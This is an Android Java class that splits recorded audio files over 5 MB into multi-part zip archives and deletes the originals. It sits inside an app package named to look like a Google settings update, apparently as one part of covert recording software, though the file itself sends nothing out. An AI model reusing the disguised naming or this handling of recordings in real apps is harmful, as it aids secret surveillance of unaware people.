package com.setting.dl.google.googlesettingupdate.phone;

import android.content.Context;

import com.setting.dl.google.googlesettingupdate.u;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.exception.ZipException;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.util.Zip4jConstants;

import java.io.File;
import java.util.ArrayList;
import java.util.Locale;

/**
 * Created by hsyn on 28.09.2017.
 */

public class FileSplitter {
   
   private Context context;
   private File    file;
   private File    folder;
   
   private static final long maxByte = 5242880; //  5 * 1024 * 1024;
   
   public FileSplitter(Context context, File file) {
      
      this.context = context;
      this.file = file;
      folder = u.getAudioFolderFile(context);
   }
   
   public FileSplitter(Context context, File file, File folder) {
      
      this.context = context;
      this.file = file;
      this.folder = folder;
   }
   
   //public static boolean needsSplit(File file) {return file.length() > maxByte;}
   
   
   public void split() {
      
      if (!file.exists()) {
         
         u.log.d("Böyle bir dosya mevcut değil");
         return;
      }
      
      
      long fileByte = file.length();
      
      
      if (fileByte > maxByte) {
         
         u.log.d("Dosya boyutu 5 MB sınırının üzerinde " + file.getName());
         u.log.d("Dosya bölünecek : " + file.getName());
         
         long minByte   = 65536;
         long splitByte = 5 * 1024 * 1024; // değersiz bir değer
         int  parts     = 2;
         
         for (; parts < 300; parts++) {
            
            long temp = fileByte / parts;
            
            if (temp > minByte && temp <= maxByte) {
               
               splitByte = temp;
               
               break;
            }
         }
         
         u.log.d(String.format(new Locale("tr"), "Dosya %d parçaya bölünecek", parts));
         u.log.d(String.format(new Locale("tr"), "parça büyüklüğü = %d bytes olacak", splitByte));
         
         ZipFile zipFile;
         
         String zipName = file.getName().split("\\.(?=[^.]+$)")[0] + ".zip";
         
         u.log.d(String.format("Dosyanın kaydedileceği yer : %s", folder.getAbsolutePath()));
         u.log.d(String.format("zip dosya ismi = %s", zipName));
         
         try {
            
            zipFile = new ZipFile(folder.getAbsolutePath() + "/" + zipName);
            
            u.log.d("zip dosyası oluşturuldu : " + zipName);
            ArrayList<File> filesToAdd = new ArrayList<>();
            filesToAdd.add(file);
            
            u.log.d("Kayıt dosyası zip dosyasına eklenmek üzere listeye kaydedildi");
            
            ZipParameters parameters = new ZipParameters();
            parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
            parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
            
            zipFile.createZipFile(filesToAdd, parameters, true, splitByte);
            
            u.log.d("zip dosyası başarılı bir şekilde parçalara ayrıldı");
            
            
            for (String part : new File(u.getAudioFolder(context)).list()) {
               
               u.log.w(part + " " + new File(part).length());
            }
            
            
            u.log.d(String.format(new Locale("tr"), "%d parça zip dosyası oluşturuldu", parts));
            
            u.deleteFile(file);
            
            u.log.d("FileSplitter sonlanıyor");
         }
         catch (ZipException e) {
            
            e.printStackTrace();
            u.log.e("zip işlemi başarısız");
            u.log.d("FileSplitter sonlanıyor");
            
         }
      }
      else {
         
         u.log.d("Dosyanın bölünmeye ihtiyacı yok : %s [%d kb]", file.getName(), file.length() / 1024L);
      }
   }
}
